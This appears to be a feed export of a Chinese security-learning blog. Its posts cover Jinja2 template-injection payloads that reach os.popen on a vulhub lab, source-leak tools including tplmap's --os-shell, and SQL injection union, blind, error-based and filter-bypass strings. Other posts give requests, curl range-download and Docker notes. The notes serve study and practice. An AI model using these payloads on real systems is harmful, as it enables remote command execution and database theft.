    <content type="html"><![CDATA[<h4 id="注入大致流程"><a href="#注入大致流程" class="headerlink" title="注入大致流程"></a>注入大致流程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 检测漏洞，寻找注入点</span><br><span class="line">2.查询基本类</span><br><span class="line">3.查找子类</span><br><span class="line">4.找到子类中可以读取文件或命令执行的模块</span><br></pre></td></tr></table></figure><blockquote><p>搭建的是vulhub的ssti靶场</p></blockquote><a id="more"></a><h3 id="查询注入点"><a href="#查询注入点" class="headerlink" title="查询注入点"></a>查询注入点</h3><p><img src="https://i.loli.net/2020/11/12/4Tg2eSL6FMxkZf9.png" alt="image-20201112172534902"></p><h3 id="查看基本类"><a href="#查看基本类" class="headerlink" title="查看基本类"></a>查看基本类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[0]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/Nrv4CEonVlPt9QJ.png" alt="image-20201112172830078"></p><p><img src="https://i.loli.net/2020/11/12/kK4tRx3jrGNvypf.png" alt="image-20201112172810920"></p><p><img src="https://i.loli.net/2020/11/12/KhoCuX8tMD4pFYz.png" alt="image-20201112172948831"></p><h3 id="查看子类"><a href="#查看子类" class="headerlink" title="查看子类"></a>查看子类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看所有子类</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.subclasses__()&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br><span class="line">查看某一个子类</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.subclasses__()[166]&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6F1W9GxwE4NbrKD.png" alt="image-20201112183533974"></p><p><img src="https://i.loli.net/2020/11/12/6xcTyqzGDjJnk94.png" alt="image-20201112183911218"></p><h3 id="查看166号子类的模板"><a href="#查看166号子类的模板" class="headerlink" title="查看166号子类的模板"></a>查看166号子类的模板</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/6tdi7SxupBJh3qW.png" alt="image-20201112184228318"></p><h3 id="查看166号子类的模板中的函数"><a href="#查看166号子类的模板中的函数" class="headerlink" title="查看166号子类的模板中的函数"></a>查看166号子类的模板中的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;]&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/ajHSTDWmh1w6ZgI.png" alt="image-20201112185201824"></p><h3 id="利用函数构造payload"><a href="#利用函数构造payload" class="headerlink" title="利用函数构造payload"></a>利用函数构造payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/o5tah4QlVHFZbxI.png" alt="image-20201112185822710"></p><blockquote><p>理解不一定对</p></blockquote><h3 id="常见的payload"><a href="#常见的payload" class="headerlink" title="常见的payload"></a>常见的payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</span><br><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>后面还需要熟练掌握各种绕过方法</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;注入大致流程&quot;&gt;&lt;a href=&quot;#注入大致流程&quot; class=&quot;headerlink&quot; title=&quot;注入大致流程&quot;&gt;&lt;/a&gt;注入大致流程&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. 检测漏洞，寻找注入点&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.查询基本类&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.查找子类&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.找到子类中可以读取文件或命令执行的模块&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;搭建的是vulhub的ssti靶场&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>源码泄露</title>
    <link href="http://example.com/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <id>http://example.com/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</id>
    <published>2020-10-31T14:01:05.000Z</published>
    <updated>2020-12-22T11:42:08.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hg-源码泄露"><a href="#hg-源码泄露" class="headerlink" title=".hg 源码泄露"></a>.hg 源码泄露</h3><p>漏洞成因：hg init的时候会生成.hg</p><a id="more"></a><h3 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h3><p>漏洞成因：在运行git init 初始化代码库的时候，会生成一个.git隐藏文件</p><h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p>泄露成因：在发布代码时未删除文件夹中隐藏.DS_Store，被发现后，获取了敏感的文件名等信息</p><p>路径检查工具：dsstoreexp</p><p><code>python ds_store_exp.py http://www.am0s.com/.DS_Store</code></p><h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>备份文件的后缀：.rar .zip .7z .tar.gz .bak  .swp .txt .html</p><h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>/WEB-INF/web.xml</td><td>web应用配置文件，描述了servlet和其他的应用组件配置及命名规则</td></tr><tr><td>/WEB-INF/classes/</td><td>站点所有用的 class 文件，包括 servlet class 和非servlet class</td></tr><tr><td>/WEB-INF/lib/</td><td>存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件</td></tr><tr><td>/WEB-INF/src/</td><td>源码目录，按照包名结构放置各个java文件</td></tr><tr><td>/WEB-INF/database.properties</td><td>数据库配置文件</td></tr></tbody></table><h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;hg-源码泄露&quot;&gt;&lt;a href=&quot;#hg-源码泄露&quot; class=&quot;headerlink&quot; title=&quot;.hg 源码泄露&quot;&gt;&lt;/a&gt;.hg 源码泄露&lt;/h3&gt;&lt;p&gt;漏洞成因：hg init的时候会生成.hg&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ripper,tplmap,GitHack安装</title>
    <link href="http://example.com/2020/10/31/ripper-tplmap-GitHack%E5%AE%89%E8%A3%85/"/>
    <id>http://example.com/2020/10/31/ripper-tplmap-GitHack%E5%AE%89%E8%A3%85/</id>
    <published>2020-10-31T13:58:16.000Z</published>
    <updated>2020-12-22T11:43:38.195Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ripper"><a href="#ripper" class="headerlink" title="ripper"></a>ripper</h3><ol><li><p>ripper是一款源码泄露利用工具；</p></li><li><p>使用范围：.git  .svn .hg 泄露；</p></li><li><p>安装方法使用docker安装；</p><blockquote><p>使用docker安装是因为此方式方便快捷</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装：sudo docker pull k0st&#x2F;alpine-dvcs-ripper</span><br><span class="line">启动：sudo docker run -i -t --rm k0st&#x2F;alpine-dvcs-ripper bash</span><br><span class="line">使用（以.svn泄露为例）：rip-svn.pl -u URL&#x2F;.svn&#x2F;</span><br><span class="line">退出：exit</span><br></pre></td></tr></table></figure><a id="more"></a></li></ol><h3 id="GitHacker"><a href="#GitHacker" class="headerlink" title="GitHacker"></a>GitHacker</h3><ol><li><p>安装</p><p><img src="https://i.loli.net/2020/10/31/UtV4IkDYWTEadsB.png" alt="image-20201031181944238"></p></li><li><p>使用</p><p><img src="https://i.loli.net/2020/10/31/qdT21hlEioH9gQL.png" alt="image-20201031182129495"></p><p>进入目录，执行脚本</p></li></ol><h3 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h3><ol><li><p>Tplmap 是ssti模板注入检测攻击工具</p></li><li><p>python2环境</p></li><li><p>ubuntu 安装</p><p>git clone <a href="https://github.com/epinna/tplmap.git">https://github.com/epinna/tplmap.git</a></p></li><li><p>开始命令</p><p>cd tplmap<br>./tplmap.py -u ‘URL’ –os-shell</p></li><li><p>退出</p><p>ctl+c</p></li><li><p>错误解决</p><p><img src="https://i.loli.net/2020/10/31/AIvFwOM684Vdyho.png" alt="image-20201031210053259"></p><p>安装yaml即可</p><p>sudo apt-get install python-yaml</p><p><img src="https://i.loli.net/2020/10/31/Rtde3guMojDKq2I.png" alt="image-20201031210258274"></p><p>安装requests</p><p>pip install requests</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;ripper&quot;&gt;&lt;a href=&quot;#ripper&quot; class=&quot;headerlink&quot; title=&quot;ripper&quot;&gt;&lt;/a&gt;ripper&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ripper是一款源码泄露利用工具；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用范围：.git  .svn .hg 泄露；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安装方法使用docker安装；&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用docker安装是因为此方式方便快捷&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;安装：sudo docker pull k0st&amp;#x2F;alpine-dvcs-ripper&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;启动：sudo docker run -i -t --rm k0st&amp;#x2F;alpine-dvcs-ripper bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;使用（以.svn泄露为例）：rip-svn.pl -u URL&amp;#x2F;.svn&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;退出：exit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2020-10-14T04:47:08.000Z</published>
    <updated>2020-12-22T11:43:28.229Z</updated>
    
    <content type="html"><![CDATA[<h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；<br>    按返回结果分类有： 报错注入 盲注入；</p><a id="more"></a><h4 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h4><ol><li><p>判断数字型注入与字符型注入<br>id=1         正确<br>id=1’        错误<br>id=1 and 1=1 正确<br>id=1 and 1=2 错误<br>则根据上述情况一般可以确定为数字型注入；<br>字符型注入要注意闭合的符号，可能有单引号，双引号，括号等；形式多样注意巧妙辨别；</p></li><li><p>注入的一般语句<br>使用 order by 确定字段数 并判断回显位置；<br>查库名 id= -1 union select schema_name from information_schema.schemata –+<br>查某库所有表名 id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=”库名” –+<br>查表中所有字段 id= -1 union select group_concat(column_name) from information_schema.columns where table_schema=”库名” and table_name=”表名”  –+<br>查字段的值 id=-1 union select 字段名 from 表名 –+</p></li><li><p>盲注入</p><ol><li>盲注入分为：基于时间盲注入与基于布尔的盲注入；</li><li>相关函数：<ol><li>sleep() 延时返回</li><li>substr(string,n,m)从字符串的第n个位置开始截取m个字符</li><li>if(expr1,expr2,expr3) 当expr1正确时执行expr2,否则执行expr3;</li></ol></li><li>基于布尔的盲注入：当页面子只返回查询的正确与错误，而不反回具体内容时适用；<ol><li>id=1 and length(database())&gt;n –+ 判断数据库的名字长度；</li><li>id=1 and substr(database(),1,1)&gt;’字符’ –+ 判断数据库名字；</li><li>id=1 and substr((select table_name from information_schema.tables where table_schema=datbase() limit 0,1), 1, 1 )=’字符’ –+ 判断表名；</li><li>id=1 and substr((select column_name from information_schema.columns where table_schema=datbase() and table_name=’表名’ limit 0,1), 1, 1 )=’字符’ –+ 判断字段；</li><li>id=1 and substr((select 字段 from 表名 limit 0,1))=’’ –+ 判断值；</li></ol></li></ol></li><li><p>延时注入：适用与页面回显不变时；</p><ol><li>id=1 and if((database()=’’),sleep(3),null)；其余类似只需要改变判断条件即可；</li></ol></li><li><p>报错注入（利用数据库的报错信息来获取我们需要的东西）</p></li><li><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>count()</td><td>统计select 返回的记录条数</td></tr><tr><td>concat()</td><td>字符串连接功能</td></tr><tr><td>floor()</td><td>向下取整</td></tr><tr><td>rand()</td><td>生成0~1 之间的随机浮点数</td></tr><tr><td>group    by</td><td>根据一个或多个列对结果进行排序</td></tr><tr><td>floor(rand(0)*2)</td><td>产生随机数0或1</td></tr><tr><td>updatexml()</td><td>mysql 5.1.5</td></tr><tr><td>extractvalue()</td><td>mysql 5.1.5</td></tr></tbody></table></li><li><p>函数利用</p><ol><li>id=1 and select count(*), concat( (…) , 0x7e , floor(rand(0)*2))x from information_schema.tables group by x –+；</li><li>id=1 and select 1 from (select counut(*), concat( (….) , 0x7e , floor(rand(0)*2) )x from information_schema.tables group by x )a –+；</li><li>id=1 and extractvalue(1, concat(0x7e,(….),0x7e)) –+ 报错信息最多32位；</li><li>id=1 and updatexml(1,concat(0x7e,(…),0x7e ),1) –+ 报错信息最多32位；</li></ol></li><li><p>格式化注入</p><ol><li>sprintf()将格式化字符串写入变量中；</li><li>sprintf(format,arg1,arg2,arg++) arg1,arg2,arg++会被插入到主字符串中的%处，该函数逐步执行，若%多于arg参数，则必须使用占位符，占位符位于%后且由数字与$组成；</li><li>该函数的php源码中只对15种类型的字符做了匹配，其他字符直接break跳出，这样它就可以吃掉转义字符,若%后有\，那么PHP会把\当作一个格式化字符的类型而吃掉,最后%\或%1$\被替换为空；</li><li>addslashes() 在单引号，双引号，反斜杠，NULL 前加反斜杠进行转义；</li><li>输入 %1$’ 变成 %1$&#39; 单引号成功逃逸；</li></ol></li></ol><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ol><li>双写绕过；oorr  ununionion seselectlect ……</li><li>大小写绕过</li><li>编码绕过:URL全编码（由于服务器会对URL编码进行一次解码，所以需要编码两次）；</li><li>内联注释绕过</li></ol>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;注入类型&quot;&gt;&lt;a href=&quot;#注入类型&quot; class=&quot;headerlink&quot; title=&quot;注入类型&quot;&gt;&lt;/a&gt;注入类型&lt;/h4&gt;&lt;p&gt;SQL注入有许多类型：按参数分类有：数字型注入与字符型注入；&lt;br&gt;    按返回结果分类有： 报错注入 盲注入；&lt;/p&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>python的requests库应用</title>
    <link href="http://example.com/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/"/>
    <id>http://example.com/2020/10/13/python%E7%9A%84requests%E5%BA%93%E5%BA%94%E7%94%A8/</id>
    <published>2020-10-13T14:24:20.000Z</published>
    <updated>2020-12-22T11:43:51.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python-requests库"><a href="#Python-requests库" class="headerlink" title="Python requests库"></a>Python requests库</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送get请求：</span></span><br><span class="line">response = requests.get(url,params=   )</span><br><span class="line"><span class="comment">#发送Post请求：</span></span><br><span class="line">response = requests.post(url,data=   )  </span><br><span class="line"><span class="comment">#获取正文内容：</span></span><br><span class="line">print(response.text)</span><br><span class="line"><span class="comment">#获取响应状态码</span></span><br><span class="line">print(response.status_code)</span><br><span class="line"><span class="comment">#定制请求头部</span></span><br><span class="line">response = requests.post(url,headers=  ) </span><br><span class="line"><span class="comment">#修改cookies</span></span><br><span class="line">response = requests.post(url , cookies= )</span><br><span class="line"><span class="comment">#设置请求超时的时间</span></span><br><span class="line">response = requests.post(url, timeout= <span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><h4 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h4><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>r.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>r.text</td><td>HTTP响应内容的字符串形式，即url对应的页面内容</td></tr><tr><td>r.encoding</td><td>从HTTP header中猜测的响应内容编码</td></tr><tr><td>r.apparent_encoding</td><td>从内容中分析出的响应内容编码方式</td></tr><tr><td>r.content</td><td>HTTP响应内容的二进制形式（图片的还原）</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Python-requests库&quot;&gt;&lt;a href=&quot;#Python-requests库&quot; class=&quot;headerlink&quot; title=&quot;Python requests库&quot;&gt;&lt;/a&gt;Python requests库&lt;/h3&gt;&lt;h4 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h4&gt;</summary>
    
    
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Curl分片下载</title>
    <link href="http://example.com/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2020/10/12/Curl%E5%88%86%E7%89%87%E4%B8%8B%E8%BD%BD/</id>
    <published>2020-10-12T04:37:58.000Z</published>
    <updated>2020-12-30T13:46:41.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020-年-天翼杯签到题"><a href="#2020-年-天翼杯签到题" class="headerlink" title="2020 年 天翼杯签到题"></a>2020 年 天翼杯签到题</h2><h4 id="题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag"><a href="#题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag" class="headerlink" title="题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag"></a>题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag</h4><a id="more"></a><h5 id="当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载"><a href="#当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载" class="headerlink" title="当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载"></a>当时看见这签到提的时候完全不会，毫无头绪，比赛完才看见大佬说需要使用curl分片下载</h5><h3 id="curl分片下载前提"><a href="#curl分片下载前提" class="headerlink" title="curl分片下载前提"></a>curl分片下载前提</h3><p>服务器需要支持  HTTP Range Request，可以用curl查看请求头，例如：<br><code> curl -I http://mirrors.ustc.edu.cn/debian-cd/amd64/ios-cd/debian-mac-9.3.0-amd64-netinst.iso</code><br>若返回结果内包含：Accept-Ranges:bytes ，则说明这个服务器是支持 HTTP Range Request的；<br>若结果不包含，则可能不支持；<br>若结果包含Accept-Ranges:none 则表示不支持；</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><code> curl --range 0-5000000000 -o  part1 &lt;url&gt;</code> –range 指定下载的某一片段；此处指定的片段大小约为50G左右；</p><h3 id="合并拼接"><a href="#合并拼接" class="headerlink" title="合并拼接"></a>合并拼接</h3><p><code> cat part1 part2 &gt; outputfile</code> </p><blockquote><p>此处应该注意片段文件的顺序<br>拼接的方法有cat和dd，cat比较简单，容易使用；</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;2020-年-天翼杯签到题&quot;&gt;&lt;a href=&quot;#2020-年-天翼杯签到题&quot; class=&quot;headerlink&quot; title=&quot;2020 年 天翼杯签到题&quot;&gt;&lt;/a&gt;2020 年 天翼杯签到题&lt;/h2&gt;&lt;h4 id=&quot;题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag&quot;&gt;&lt;a href=&quot;#题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag&quot; class=&quot;headerlink&quot; title=&quot;题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag&quot;&gt;&lt;/a&gt;题目描述：赛方给出了一个6G的大文件让我们下载，但是速度只有几k，明显不可能靠下载完成获取flag&lt;/h4&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/10/12/ubuntu%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://example.com/2020/10/12/ubuntu%E5%AE%89%E8%A3%85Docker/</id>
    <published>2020-10-12T04:36:18.062Z</published>
    <updated>2021-08-01T11:57:05.437Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"> </span><br><span class="line"># step 2: 安装GPG证书</span><br><span class="line">curl -fsSL http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line"> </span><br><span class="line"># Step 3: 写入软件源信息</span><br><span class="line">sudo add-apt-repository &quot;deb [arch&#x3D;amd64] http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot;</span><br><span class="line"> </span><br><span class="line"># Step 4: 更新并安装Docker-CE</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install docker-ce</span><br></pre></td></tr></table></figure><p>#设置开机自启</p><h3 id="docker开机自启：sudo-systemctl-enable-docker-service"><a href="#docker开机自启：sudo-systemctl-enable-docker-service" class="headerlink" title="docker开机自启：sudo systemctl enable docker.service"></a>docker开机自启：sudo systemctl enable docker.service</h3><h3 id="容器开机自启：启动容器时加上-–restart-always"><a href="#容器开机自启：启动容器时加上-–restart-always" class="headerlink" title="容器开机自启：启动容器时加上 –restart=always"></a>容器开机自启：启动容器时加上 –restart=always</h3><a id="more"></a><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;xx0cvw91.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
    
    
